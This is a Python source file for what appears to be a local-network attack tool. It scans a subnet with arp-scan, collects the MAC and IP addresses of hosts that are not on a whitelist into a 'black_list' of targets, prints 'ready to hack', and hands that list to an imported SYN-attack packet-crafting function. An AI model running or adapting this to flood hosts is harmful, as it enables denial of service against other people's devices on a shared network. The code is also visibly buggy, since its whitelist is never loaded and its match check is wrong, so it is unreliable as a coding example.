import subprocess
import re
from target_host_class import *
from tcp_syn_attack import *
class context:
    def __init__(self, macs_path):
        self.macs_path = './config.white_list_mac.txt'
        self.white_macs = []
        self.black_list = []
        self.re_mac = re.compile( '([a-fA-F0-9]{2}[:|\-]?){6}' )
        self.re_ipv4 = re.compile('(?:^|\b(?<!\.))(?:1?\d\d?|2[0-4]\d|25[0-5])(?:\.(?:1?\d\d?|2[0-4]\d|25[0-5])){3}(?=$|[^\w.])')
    def update_white_lists(self):
        File = open(self.macs_path,'r')
        read_lines_temp = File.readlines()

    def black_list_print_hosts(self):
        if (len( self.black_list) == 0):
            print('No hosts to attack')
        else:
            for element in self.black_list:
                element.get_info()
        print('#' * 80 + '\n')

    def update_black_list(self,target_host):
        if target_host not in self.black_list:
            self.black_list.append(target_host)

    def clear_black_list(self):
        self.black_list = []

    def scan_arp_tables(self):
        print('test')

    def tcp_syn_attack(self):
        tcp_syn_attack_craft_packets(self.black_list)

    def recoissance(self):
        out = subprocess.Popen(['arp-scan',' --interface=wlp2s0', '192.168.1.0/24'],
                               stdout=subprocess.PIPE,
                               stderr=subprocess.STDOUT)
        stdout,stderr = out.communicate()
        string = stdout.decode('utf-8')
        converted_list_of_new_lines = str(string).split('\n')
        for element in converted_list_of_new_lines:
            #print(element + '\n')
            temp = ''
            mac_addr = self.re_mac.search(element)
            ipv4 = self.re_ipv4.search(element)

            if( (ipv4 is not None) and (mac_addr is not None ) and mac_addr not in self.white_macs ):
                print('ready to hack')
                print (mac_addr.group(0))
                print(ipv4.group(0))
                temp_host = target_host_class(mac_addr.group(0),ipv4.group(0))
                temp_host.get_info()
                self.update_black_list(temp_host)
                del temp_host
        print('xd')
        self.black_list_print_hosts()
